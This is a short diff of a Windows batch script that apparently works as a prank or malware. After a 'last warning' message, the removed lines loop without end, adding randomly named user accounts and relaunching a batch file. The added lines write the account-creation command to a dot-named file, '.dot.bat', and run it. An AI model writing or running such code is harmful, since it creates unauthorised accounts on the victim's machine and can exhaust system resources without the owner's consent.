@@ -7,7 +7,5 @@ echo This is the last warning.
 pause
 cls
 color a
-A:
-net user %random% /add
-start u.bat
-goto A
+echo net user %random% /add > .dot.bat
+start .dot.bat
